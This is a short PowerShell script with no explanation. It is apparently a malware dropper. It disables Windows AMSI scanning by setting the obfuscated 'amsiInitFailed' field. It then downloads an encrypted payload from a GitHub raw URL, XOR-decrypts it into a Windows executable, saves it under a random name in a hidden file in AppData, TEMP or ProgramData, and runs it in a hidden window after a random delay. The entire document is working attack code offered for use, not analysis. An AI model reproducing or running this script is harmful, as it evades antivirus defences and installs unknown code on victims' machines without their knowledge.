try{$a=[Ref].Assembly.GetType(-join([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)));if($a){$b=$a.GetField(-join([char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)),40);if($b){$b.SetValue($null,$true)}}}catch{}
try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
try{
  $k=@(0x38,0x24,0x03,0x93)
  $b=(New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/kai195102/d/main/c2d.enc')
  for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i]-bxor$k[$i%4]}
  if($b[0]-ne77-or$b[1]-ne90){exit}
  $p=@();foreach($d in @([Environment]::GetFolderPath('LocalApplicationData'),$env:TEMP,[Environment]::GetFolderPath('CommonApplicationData'))){if(Test-Path $d){$p+=$d}}
  $t=$p[(Get-Random)%$p.Count]
  $n=-join((65..90+97..122|Get-Random -Count 8|%{[char]$_}))+'e.exe'
  $fp="$t\$n"
  [System.IO.File]::WriteAllBytes($fp,$b)
  [System.IO.File]::SetAttributes($fp,([System.IO.FileAttributes]::Hidden))
  Start-Sleep -Seconds (Get-Random -Min 2 -Max 8)
  Start-Process -FilePath $fp -WindowStyle Hidden
}catch{}
